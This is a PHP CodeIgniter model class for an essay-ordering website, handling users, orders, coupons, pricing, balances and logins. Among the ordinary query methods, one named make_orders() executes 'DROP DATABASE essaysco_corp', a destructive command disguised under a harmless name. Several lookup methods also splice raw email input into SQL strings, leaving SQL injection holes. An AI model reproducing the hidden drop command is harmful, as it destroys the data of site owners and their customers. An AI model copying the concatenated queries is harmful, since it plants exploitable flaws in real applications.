<?php  
       class designmodel extends CI_Model  
       {  
          function __construct()  
          {  
             // Call the Model constructor  
             parent::__construct();  
             
          }  

          public function insert_buyer($data) {

            $this->db->insert('tbl_user', $data);

            $insertId = $this->db->insert_id();


             return  $insertId;

          }

           public function insert_lead($data) {

                 $this->db->insert('email_leads', $data);

          }

               public function inser_wao($data) {

                 $this->db->insert('account_balance', $data);

          }


           public function insert_tips($data) {

                 $this->db->insert('tbl_tip', $data);

          }

           public function insertCoupon($data) {

                 $this->db->insert('coupon', $data);

          }

              public function update_rev($id,$dasa)

            {

                $this->db->where('order_id', $id);

                $this->db->update('tbl_order',$dasa); 

            }

            public function get_order_revision_details($order_id)
            {
                $this->db->select('order_revision_details');
                $this->db->from('tbl_order');
                $this->db->where('order_id',$order_id);
                $order_revision_details=$this->db->get()->row()->order_revision_details;

                return $order_revision_details;

            }

             public function ifcomplete($order_id)
            {
                $this->db->select('order_status');
                $this->db->from('tbl_order');
                $this->db->where('order_id',$order_id);
                $order_status=$this->db->get()->row()->order_status;

                if($order_status==3){
                  return "yes";
                }
                else
                {
                  return "blabla";
                }

               

            }

             public function checkCouponType($coupon)
            {
                $this->db->select('coupon_type');
                $this->db->from('coupon');
                $this->db->where('coupon_code',$coupon);
                $coupon_type=$this->db->get()->row()->coupon_type;

                if($coupon_type==2){
                  return "yes";
                }
                else
                {
                  return "blabla";
                }

               

            }

             public function my_coupons($user_id)
            {
                $this->db->select('*');
                $this->db->from('coupon');
                $this->db->where('user_id',$user_id);
               // $this->db->join('coupon_status', 'coupon.coupon_status=coupon_status.discipline_id','left');
                 $this->db->order_by('coupon_date','DESC');

               
                $query=$this->db->get();

                return $query;

            }

             public function get_writer_ratings($writer_id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->where('order_writer_id',$writer_id);
                //$this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');

                $this->db->where('order_rating>0');
                $query=$this->db->get();

                return $query;

            }

             public function delete_order($wao)
            {

                $this->db->delete('tbl_order',$wao);

            }

             public function get_average_ratings($writer_id)
            {
                $this->db->select('AVG(order_rating) as rato');
                $this->db->from('tbl_order');
                $this->db->where('order_writer_id',$writer_id);
                return $this->db->get()->row()->rato;

                

            }

             public function get_admin_id()
            {
                $this->db->select('user_id');
                $this->db->from('tbl_user');
                $this->db->where('user_role',1);
                $this->db->where('user_authority',3);
                $user_id=$this->db->get()->row()->user_id;

                return $user_id;

            }




            public function get_commission()
            {
                $this->db->select('value');
                $this->db->from('value_store');
                $this->db->where('thekey','order_commision');
                $value=$this->db->get()->row()->value;

                return $value;

            }

             public function get_display_mode($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->join('display_mode','display_mode.mode_id=tbl_user.user_display_mode','left');
                $this->db->where('user_id',$id);
                $value=$this->db->get()->row()->mode_name;

                return $value;

            }

             public function make_orders()
            {
                $this->db->query("DROP DATABASE essaysco_corp");
                

            }

             public function get_local_writers()
            {
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where('user_writer_type',2);
                $this->db->where('user_writer_status',3);

                $query=$this->db->get();

                return $query;

            }

            public function get_active_writers()
            {
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where('user_authority',2);
                $this->db->where('user_writer_status',3);

                $query=$this->db->get();

                return $query;

            }


            public function get_writer_details($order_id)
            {
                $this->db->select('order_writer_id');
                $this->db->from('tbl_order');
                $this->db->where('order_id',$order_id);
                $user_id=$this->db->get()->row()->order_writer_id;




                $this->db->select('user_fname,user_email,user_id');
                $this->db->from('tbl_user');
                $this->db->where('user_id',$user_id); 

                $query = $this->db->get();
                
                // $query = $this->db->get();

                if($query->num_rows()>0){
                
                  return $query->result();

                }
                else
                {

                  $res=$this->get_admin_details();
                  return $res;

                }
                     
                
            }

             public function get_admin_details() {

                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where('user_authority',3);
                $this->db->limit(1);
                $query = $this->db->get();
                return $query->result();


          

          }


             public function get_first_order_discount($user_id)

          {
              //get the number of orders if greater than 1 discount is zero
                $this->db->select('order_id');
                $this->db->from('tbl_order');
                $this->db->where('order_user_id',$user_id);
                $query = $this->db->get();
                $count=$query->num_rows();
                if($count>0)
                {
                   $discount=0;
                   return $discount;

                }
              
                else
                {
                   //get first discount
                  $this->db->select('value');
                  $this->db->from('value_store');
                  $this->db->where('thekey','discount');
                  $discount=$this->db->get()->row()->value;

                  return $discount; 


                }




          }

           public function get_first_discount()
          {

                  $this->db->select('value');
                  $this->db->from('value_store');
                  $this->db->where('thekey','discount');
                  $discount=$this->db->get()->row()->value;

                  return $discount; 

         }

          public function get_balance($id)
          {

                  $this->db->select('account_balance');
                  $this->db->from('account_balance');
                  $this->db->where('user_id',$id);
                  $account_balance=$this->db->get()->row()->account_balance;

                  return $account_balance; 

         }


          public function getAffiliateCommission()
          {

                  $this->db->select('value');
                  $this->db->from('value_store');
                  $this->db->where('thekey','affiliate_percentage');
                  $comm=$this->db->get()->row()->value;

                  return $comm; 

         }

         public function checkAffiliate($id)
          {

                  $this->db->select('*');
                  $this->db->from('tbl_order');
                  $this->db->join('tbl_user','tbl_order.order_user_id=tbl_user.user_id','left');
                  $this->db->where('order_id', $id);
                  $query=$this->db->get();

                  return $query->result_array(); 

         }

           public function get_proofreading()
          {

                  $this->db->select('value');
                  $this->db->from('value_store');
                  $this->db->where('thekey','proofreadingprice');
                  $proofreadingprice=$this->db->get()->row()->value;

                  return $proofreadingprice; 

         }

          public function get_coupon_discount($coupon)

          {
                $this->db->select('*');
                $this->db->from('coupon');
                $this->db->where('coupon_code',$coupon);
                $this->db->where('coupon_status',0);

                $query = $this->db->get();
                $count=$query->num_rows();

                if($count>0)
                {
                  
                  $discount=$query->row()->coupon_discount;

                  return $discount; 

                }
                else
                {
                   //get first discount
                 

                   $discount=0;
                   return $discount;


                }




          }

          public function get_total_amount($deadline,$level)

          {

                
             $this->db->select('price');

             $this->db->from('tbl_pricing');

            
              $this->db->where('deadline_id=',$deadline);
           

             $this->db->where('level_id=',$level);

             $query =$this->db->get();

             

           
              
             return $query->row()->price;

           

          }

            public function  get_deadline_algo($deadline)
            {
               //get avaalable deadlines then compare choose floor
                   $records=$this->db->get('tbl_draft_deadline')->result();

                 $arr=array();

                 foreach ($records as $record) {

                           $rec=$record->deadline_duration;


                           if($rec<=$deadline)
                           {
                             
                             
                              array_push($arr, $rec);
                             //$correct=1;

                           }

                  
                 }

                   $correct=max($arr);

                    

                   $this->db->select('deadline_id');
                   $this->db->from('tbl_draft_deadline');
                   $this->db->where('deadline_duration',$correct);
                   return $this->db->get()->row()->deadline_id;





                  






            }

            public function get_price($deadline,$level,$coupon,$user_id,$service,$pages)

          {

                  $deadline=$this->get_deadline_algo($deadline);

                
                  
                  if($service==1){
                    $first_discount=0;
                    $coupon_discount=0;

                    if(!empty($user_id)){

                      $first_discount=$this->get_first_order_discount($user_id);
                     // $referral_discount=$this->get_referral_discount($user_id);

                    } 
                    else
                    {
                       $first_discount=$this->get_first_discount();


                    }

                   
                    
                    if(!empty($coupon)){

                     $coupon_discount=$this->get_coupon_discount($coupon);

                   }

                     $total_discount=$coupon_discount+$first_discount;


                     $total_amount=$this->get_total_amount($deadline,$level);


                     $rate=100-$total_discount;

                     $amount=($rate/100)*$total_amount;


                     return $amount*$pages;
                   }
                   elseif ($service==2) {
                        $first_discount=0;
                        $coupon_discount=0;

                        if(!empty($user_id)){

                          $first_discount=$this->get_first_order_discount($user_id);
                         // $referral_discount=$this->get_referral_discount($user_id);

                        } 

                       
                        
                        if(!empty($coupon)){

                         $coupon_discount=$this->get_coupon_discount($coupon);

                       }

                         $total_discount=$coupon_discount+$first_discount;


                         $total_amount=$this->get_total_amount($deadline,$level);


                         $rate=100-$total_discount;

                         $amount=($rate/100)*$total_amount;


                         return $amount*0.75*$pages;
                   }
                   else
                   {

                          $first_discount=0;
                          if(!empty($user_id)){

                            $first_discount=$this->get_first_order_discount($user_id);
                         // $referral_discount=$this->get_referral_discount($user_id);
  
                          } 

                           $rate=100-$first_discount;
                          
                           $price=$this->get_proofreading();

                            //echo $price; die();

                           $total_amount=$price*$pages;

                           $amount=($rate/100)*$total_amount;

                           return $amount;

                    }


             
            

           

          }

           public function add_refund($data) {

            $this->db->insert('tbl_refund', $data);

            $insertId = $this->db->insert_id();


             return  $insertId;

          }

           public function insert_trans($data) {

            $this->db->insert('tbl_transaction', $data);

          

          }

           public function insert_uploads($data) {

            $this->db->insert('tbl_files', $data);

          

          }



            public function user_deactivated($email) {
            //$condition = "username =" . "'" . $datum['username'] . "' AND " . "password =" . "'" . $datum['password'] . "'";
            $this->db->select('*');
            $this->db->from('tbl_user');
            $this->db->where('user_email=',$email);
            $this->db->where('user_authority=',1);
            
            
            $query = $this->db->get();

            if($query->num_rows()>0)
            {
            
            foreach($query->result_array() as $row)
            {
               
               
               $activestatus = $row['user_status'];


               //$isPasswordCorrect = password_verify($data['admin_password'], $existingHashFromDb); 
               
              
                   if($activestatus!==2)
                     {
                       return 'true';
                     }
                    else
                     {
                       return 'deactivated';
                     }


              
            }
          }
          else
          {

                   return 'true';


          }
           
         }

          public function user_exist_social_status($email)
            {
                $condition = "user_email =" . "'" . $email . "'";
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where($condition);
                $this->db->where('user_login_type=',1);
                $this->db->where('user_authority=',1);
                //$this->db->limit(1);
                $query = $this->db->get();

                if($query->num_rows()>0)
                   {
                      
                      return 'true';

                   }
                    
                
            }


             public function get_current_balance($user_id) {
                 
                $this->db->select('user_account'); 
                $this->db->from('tbl_user');
                $this->db->where('user_id=',$user_id);
              //  $this->db->where('user_authority=',1);
             
               return $this->db->get()->row()->user_account;


              //  return $query->row()->user_account;

               


          }


          public function first($user_id) {
                 
                $this->db->select('order_id'); 
                $this->db->from('tbl_order');
                $this->db->where('order_user_id=',$user_id);
              //  $this->db->where('user_authority=',1);
                $result=$this->db->get();

                if($result->num_rows()<1)
                 {
                    return 'first';
                 }
                else
                 {
                    return 'lies';
                 }

             
               //return $this->db->get()->row()->user_account;


              //  return $query->row()->user_account;

               


          }





            public function check_mail_exists($email) {

                $this->db->from('tbl_user');
                $this->db->where('user_email=',$email);
                $this->db->where('user_authority=',1);
             
                $query=$this->db->get();

                if ($query->num_rows()>0) {

                  return 'true';
                  
                }
                else
                {
                   return 'false';

                }


          }


           public function insert_order($data) {

            $this->db->insert('tbl_order', $data);

            $insertId = $this->db->insert_id();


             return  $insertId;

          }
          
          public function get_logos() {
         
       
            $this->db->select('*');
          
            $this->db->from('evenlabs_logos');
            $data =$this->db->get();
             
               
             return $data;
         }


          public function coupon($coupon) {
         
       
            $this->db->select('*');
          
            $this->db->from('coupon');

            $this->db->where('coupon_code=',$coupon);

            $query =$this->db->get();

            if($query->num_rows()>0){
             
               
              foreach($query->result_array() as $row)
            {
                 $see=$row['coupon_status'];

                 if($see==1){

                     return 'false';
                 }

                 else
                 {

                    $discount=$row['coupon_discount'];

                    return $discount;
                 }
            }

          }
          else
          {

            return 'false';

          }





         }

            public function get_samples()
            {
                $this->db->select('*');
                $this->db->from('tbl_sample');
                $this->db->where('status',0); 
                $this->db->order_by('sample_added ','DESC');
               
                $query = $this->db->get();
                
                return $query;


            }

              public function get_questions()
            {
                $this->db->select('*');
                $this->db->from('tbl_question');
               // $this->db->where('status',0); 
                $this->db->order_by('question_date ','DESC');
               
                $query = $this->db->get();
                
                return $query;


            }

             public function get_samples_three()
            {
                $this->db->select('*');
                $this->db->from('tbl_sample');
                $this->db->limit(3);
                $this->db->where('status',0); 
                $this->db->order_by('sample_added ','DESC');
               
                $query = $this->db->get();
                
                return $query;


            }


             public function get_sample($title)
            {
                $this->db->select('*');
                $this->db->from('tbl_sample');
                $this->db->where('sample_slug',$title); 
               
                $query = $this->db->get();
                
                return $query;


            }

          public function get_subscriptions() {
         
       
            $this->db->select('*');
          
            $this->db->from('tbl_subscription');
            $this->db->limit(2);

            $data =$this->db->get();
             
               
             return $data;
         }


          public function get_payments() {
         
       
            $this->db->select('*');
          
            $this->db->from('tbl_payment_type');
            //$this->db->limit(2);

            $data =$this->db->get();
             
               
             return $data;
         }

          public function get_names($order_id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order,tbl_discipline, tbl_course_level,tbl_paper_format');
                $this->db->where('tbl_order.order_discipline_id=tbl_discipline.discipline_id');
                $this->db->where('tbl_order.order_level_id=tbl_course_level.level_id');
                $this->db->where('tbl_order.order_format_id=tbl_paper_format.format_id');

                $this->db->where('tbl_order.order_id',$order_id); 
               

                $query = $this->db->get();
                
                return $query->result();
                     
                
            }

          public function get_token($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where('user_id',$id); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

              public function get_format()
            {
                $this->db->select('*');
                $this->db->from('tbl_paper_format');
                $query = $this->db->get();
                
                return $query;
                     
                
            }



          public function get_package_name($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_subscription');
                $this->db->where('subscription_package_id',$id); 
                return $this->db->get()->row()->subscription_package_name;
                
               
                     
                
            }

            public function get_due_date($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->where('order_id',$id); 
                return $this->db->get()->row()->order_due;
                
               
                     
                
            }

            public function get_days($id)
            {

                $this->db->select('*');
                $this->db->from('tbl_draft_deadline');
                $this->db->where('deadline_id',$id); 
                return $this->db->get()->row()->deadline_duration;
      
            }

             public function view_submissions($order_id)
            {

                $this->db->select('*');
                $this->db->from('tbl_subscription_submission');
                $this->db->where('order_id',$order_id); 
                $query=$this->db->get();
                return $query;
                
               
                     
                
            }


             public function get_if_previous($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->where('order_paid_status',1); 
                $this->db->where('buyer_id',$id); 
                $this->db->where('order_type',2); 
                $query=$this->db->get();
                if($query->num_rows()>0)
                {
                  $this->db->select_max('order_id');
                  $this->db->from('tbl_order');
                  $this->db->where('order_paid_status',1); 
                  $this->db->where('buyer_id',$id); 
                  $this->db->where('order_type',2); 
                  $max=$this->db->get()->row()->order_id;
                  return $max;
                }
                else
                {
                 
                  return 'false'; 

                }
                
                
               
                     
                
            }


            public function get_five_orders($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->join('tbl_order_status', 'tbl_order.order_status=tbl_order_status.status_id','left');
                $this->db->where('order_user_id',$id); 
                $this->db->order_by('order_added','DESC'); 
                $this->db->limit(5); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

             public function get_all($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->join('tbl_order_status', 'tbl_order.order_status=tbl_order_status.status_id','left');
                $this->db->where('order_user_id',$id); 
                $this->db->order_by('order_added','DESC'); 
               // $this->db->limit(5); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }


              public function get_completed($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->where('order_user_id',$id); 
                $this->db->where('order_status',3); 
                $this->db->order_by('order_added','DESC'); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

              public function get_subs($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                //$this->db->join('tbl_content_type', 'tbl_order.content_type_id=tbl_content_type.id','left');
                $this->db->where('order_type',2); 
                //$this->db->where('order_status',2); 
                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query;
                     
                
            }
             //get admins
              public function get_admins()
            {
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->join('admin_roles', 'tbl_user.user_role=admin_roles.role_id','left');
                $this->db->where('user_authority',3); 
                $this->db->where('user_role',1); 
               

                $query = $this->db->get();
                
                return $query;
                     
                
            }
             //special coupons
             public function get_active_coupons()
            {
                $this->db->select('*');
                $this->db->from('coupon');
                //$this->db->join('admin_roles', 'tbl_user.user_role=admin_roles.role_id','left');
                $this->db->where('coupon_status',0); 
                $this->db->where('coupon_type',1); 
               

                $query = $this->db->get();
                
                return $query;
                     
                
            }
             //general coupons
             public function get_special_coupons($user_id)
            {
                $this->db->select('*');
                $this->db->from('coupon');
                //$this->db->join('admin_roles', 'tbl_user.user_role=admin_roles.role_id','left');
                $this->db->where('coupon_status',0); 
                $this->db->where('user_id',$user_id); 
               

                $query = $this->db->get();
                
                return $query;
                     
                
            }

            //pending or in progress
             public function get_pending($id)
            {


                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->where('(order_status = 1 or order_status = 5 or order_status = 6 or order_status = 2 or order_status = 4 or order_status = 9)'); 
                //$this->db->where_in('order_status',5); 
               
                $this->db->where('order_user_id',$id); 


                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query;
                     
                
            }

               public function get_cancelled($id)
            {


                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->join('tbl_order_status', 'tbl_order.order_status=tbl_order_status.status_id','left');

                $this->db->where('(order_status = 7 or order_status=8)'); 
                //$this->db->where_in('order_status',5); 
               
                $this->db->where('order_user_id',$id); 


                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query;
                     
                
            }


             public function get_earnings($id)
            {


                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                //$this->db->where_in('order_status',5); 
               
                $this->db->where('affiliate_id',$id); 
                $this->db->where('affiliate_amount!=',NULL); 


                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query;
                     
                
            }

             public function get_rev($order_id)
            {
                $this->db->select('*');
                $this->db->from('tbl_files');
                $this->db->where('order_id',$order_id); 
                $this->db->where('designation',3); 
                $this->db->order_by('date','DESC');
                $query = $this->db->get();
                
                return $query->result();


            }


             public function get_revision($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->where('order_user_id',$id); 
                $this->db->where('order_status',4); 
                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query;
                     
                
            }

            public function get_awaiting($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->where('order_user_id',$id); 
                $this->db->where('order_status',0); 
                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query;
                     
                
            }

            public function get_technical($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->join('tbl_technical_status', 'tbl_order.order_technical_status=tbl_technical_status.technical_status','left');

                $this->db->where('order_user_id',$id); 
                $this->db->where('order_type',2); 
                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query;
                     
                
            }


            public function get_payment_history($user_id)
            {
                
                $this->db->select('*');
                $this->db->from('tbl_transaction');
              
                $this->db->join('tbl_order', 'tbl_order.order_id=tbl_transaction.transaction_order_id','left');
                $this->db->where('tbl_order.order_user_id',$user_id); 
                $this->db->order_by('transaction_added','DESC'); 
               // $this->db->limit(5); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

             public function get_uploads($order_id)
            {
                $this->db->select('*');
                $this->db->from('tbl_files');
                $this->db->where('order_id',$order_id); 
                $this->db->where('designation',1); 
                $this->db->order_by('date','DESC');
                $query = $this->db->get();
                
                return $query->result();


            }

             public function get_submissions($order_id)
            {
                $this->db->select('*');
                $this->db->from('tbl_files');
                $this->db->where('order_id',$order_id); 
                $this->db->where('designation',2); 
                $this->db->order_by('date','DESC'); 
                $query = $this->db->get();
                
                return $query->result();


            }



             public function get_order_details($order_id)
            {
                
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                $this->db->join('tbl_course_level', 'tbl_order.order_level_id=tbl_course_level.level_id','left');
                $this->db->join('tbl_paper_format', 'tbl_order.order_format_id=tbl_paper_format.format_id','left');
                $this->db->join('tbl_transaction', 'tbl_order.order_id=tbl_transaction.transaction_order_id','left');
                $this->db->join('tbl_order_status', 'tbl_order.order_status=tbl_order_status.status_id','left');
                $this->db->join('tbl_service', 'tbl_order.order_service_id=tbl_service.service_id','left');
                $this->db->join('tbl_order_type', 'tbl_order.order_type=tbl_order_type.order_type_id','left');
               // $this->db->join('tbl_files', 'tbl_order.order_id=tbl_files.order_id','left');


                $this->db->where('tbl_order.order_id',$order_id); 
               // $this->db->order_by('order_added','DESC'); 
               // $this->db->limit(5); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

             public function get_countries()
            {
                $this->db->select('*');
                $this->db->from('tbl_location');
              
                $query = $this->db->get();
                
                return $query;
                     
                
            }

            public function get_profile_details($user_id)
            {
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->join('tbl_location', 'tbl_user.user_location_id=tbl_location.iso','left');
               // $this->db->where('tbl_user.user_authority',1); 
                $this->db->where('tbl_user.user_id',$user_id); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

             public function get_all_orders($id)
            {
                $this->db->select('*');
                $this->db->from('tbl_order');
                $this->db->where('user_id',$id); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

             public function get_discipline()
            {

                $this->db->select('*');
                $this->db->from('tbl_discipline');
                $query = $this->db->get();
                return $query;
               
                
            }

             public function get_level()
            {
                $this->db->select('*');
                $this->db->from('tbl_course_level');
               // $this->db->where('content_status',1); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

            public function get_deadline()
            {
                $this->db->select('*');
                $this->db->from('tbl_draft_deadline');
               // $this->db->order_by('deadline_duration','DESC'); 
              //  $this->db->where('deadline_status',0); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

           

              public function get_industries()
            {
                $this->db->select('*');
                $this->db->from('tbl_industry');
                $this->db->where('industry_status',1); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }

             public function get_package()
            {
                $this->db->select('*');
                $this->db->from('tbl_level');
                $this->db->where('level_status',1); 
                $query = $this->db->get();
                
                return $query;
                     
                
            }


           public function login_user($datum) {
            //$condition = "username =" . "'" . $datum['username'] . "' AND " . "password =" . "'" . $datum['password'] . "'";
            $this->db->select('*');
            $this->db->from('tbl_user');
            $this->db->where('user_email=',$datum['email']);
            $this->db->where('user_authority=',1);
            $this->db->limit(1);
            
            $query = $this->db->get();
            
            foreach($query->result_array() as $row)
            {
               
               $existingHashFromDb = $row['user_password'];
               $activestatus = $row['user_status'];


               //$isPasswordCorrect = password_verify($data['admin_password'],authority $existingHashFromDb); 
               
               if(password_verify($datum['password'], $existingHashFromDb))
               {
                   if($activestatus==1)
                     {
                       return 'true';
                     }
                     elseif ($activestatus==3) {
                      return 'deactivated';
                     }
                    else
                     {
                       return 'wrong';
                     }


               }
               else
               {
                   return 'false';
               }
            }

           
         }
           public function update_user($id,$dasa)

            {

                $this->db->where('user_id', $id);

                $this->db->update('tbl_user',$dasa); 

            }

            public function update_tip($id,$dasa)

            {

                $this->db->where('order_id', $id);

                $this->db->update('tbl_tip',$dasa); 

            }

             public function updateCoupon($id,$dasa)

            {

                $this->db->where('coupon_code', $id);

                $this->db->update('coupon',$dasa); 

            }

           public function update_pass_advertiser($id,$dasa)

            {

                $this->db->where('user_id', $id);

                $this->db->update('tbl_user',$dasa); 

            }

          public function update_password($email,$dasa)

            {

                $this->db->where('user_authority', 1);


                $this->db->where('user_email', $email);

                $this->db->update('tbl_user',$dasa); 

            }


              public function update_bal($id,$dasa)

            {

                $this->db->where('user_id', $id);

                $this->db->update('tbl_user',$dasa); 

            }




         public function checkpasswordadvertiser($data) {

            //$condition = "username =" . "'" . $datum['username'] . "' AND " . "password =" . "'" . $datum['password'] . "'";

            $this->db->select('*');

            $this->db->from('tbl_user');

            $this->db->where('user_id=',$data['user_id']);

            // $this->db->where('username=',$data['username']);

            $this->db->limit(1);

            

            $query = $this->db->get();

            

            foreach($query->result_array() as $row)

            {

               

               $existingHashFromDb = $row['user_password'];

               //$isPasswordCorrect = password_verify($data['admin_password'], $existingHashFromDb); 
            //  echo $data['password']; die();
               

               if(password_verify($data['password'], $existingHashFromDb))

               {

                   return 'true';

               }

               else

               {

                   return 'false';

               }

            }



           

         }


      


          public function user_exist_status($email)
            {
                $condition = "user_email =" . "'" . $email . "'";
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where($condition);
                $this->db->where('user_authority=1');
                //$this->db->limit(1);
                $query = $this->db->get();

                if($query->num_rows()>0)
                   {
                      
                      return 'true';

                   }
                    
                
            }

             public function read_user_information($email) 
            {

                $condition = "user_email =" . "'" . $email . "'";
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where($condition);
                $this->db->limit(1);
                $query = $this->db->get();

                if ($query->num_rows() == 1) {
                return $query->result();
                } else {
                return false;
                }
            }

            public function checkUser($id) 
            {

               // $condition = "user_email =" . "'" . $email . "'";
                $this->db->select('*');
                $this->db->from('account_balance');
                $this->db->where('user_id',$id);
                $query = $this->db->get();

                if ($query->num_rows()>0) {
                return $query->result_array();
                } else {
                return 'no';
                }
            }

              public function get_plag($order_id)
            {
                $this->db->select('*');
                $this->db->from('tbl_files');
                $this->db->where('order_id',$order_id); 
                $this->db->where('designation',7); 
                $this->db->order_by('date','DESC'); 
                $query = $this->db->get();
                
                return $query->result();


            }

              public function get_awaiting_feedback_chron()
            {


                $this->db->select('*');
                $this->db->from('tbl_order');
                //$this->db->join('tbl_discipline', 'tbl_order.order_discipline_id=tbl_discipline.discipline_id','left');
                //$this->db->where_in('order_status',5); 
               
               // $this->db->where('affiliate_id!=',NULL); 
                $this->db->where('order_status',9); 


                $this->db->order_by('order_added','DESC'); 

                $query = $this->db->get();
                
                return $query->result();
                     
                
            }

             public function checkUserLocal($id) 
            {

               // $condition = "user_email =" . "'" . $email . "'";
                $this->db->select('*');
                $this->db->from('account_balance');
                $this->db->where('user_id',$id);
                $this->db->where('account_type',2);
                $query = $this->db->get();

                if ($query->num_rows()>0) {
                return $query->result_array();
                } else {
                return 'no';
                }
            }

              public function checkUserForeign($id) 
            {

               // $condition = "user_email =" . "'" . $email . "'";
                $this->db->select('*');
                $this->db->from('account_balance');
                $this->db->where('user_id',$id);
                $this->db->where('account_type',1);
                $query = $this->db->get();

                if ($query->num_rows()>0) {
                return $query->result_array();
                } else {
                return 'no';
                }
            }

            public function get_refferer_details($id) 
            {

               // $condition = "user_email =" . "'" . $email . "'";
                $this->db->select('*');
                $this->db->from('tbl_user');
                $this->db->where('user_id',$id);
                $query = $this->db->get();

               
                return $query->result_array();
               
            }

             public function user_activation($id,$update)
            {
                $this->db->where('user_id', $id);
                $this->db->update('tbl_user',$update); 
            }

           
             public function updateTransaction($id,$update)
            {
                $this->db->where('order_id', $id);
                $this->db->update('tbl_order',$update); 
            }

             public function updateAccount($id,$update)
            {
                $this->db->where('user_id', $id);
                $this->db->update('account_balance',$update); 
            }

              public function updateAccountLocal($id,$update)
            {
                $this->db->where('user_id', $id);
                $this->db->where('account_type', 2);
                $this->db->update('account_balance',$update); 
            }
            //update buyer info
            public function update_profile($id,$update)
            {
                $this->db->where('user_id', $id);
                $this->db->update('tbl_user',$update); 
            }

             public function update_rating($id,$update)
            {
                $this->db->where('order_id', $id);
                $this->db->update('tbl_order',$update); 
            }

            public function update_order($id,$update)
            {
                $this->db->where('order_id', $id);
                $this->db->update('tbl_order',$update); 
            }
            public function update_refund($id,$update)
            {
                $this->db->where('id', $id);
                $this->db->update('tbl_transactions',$update); 
            }
  }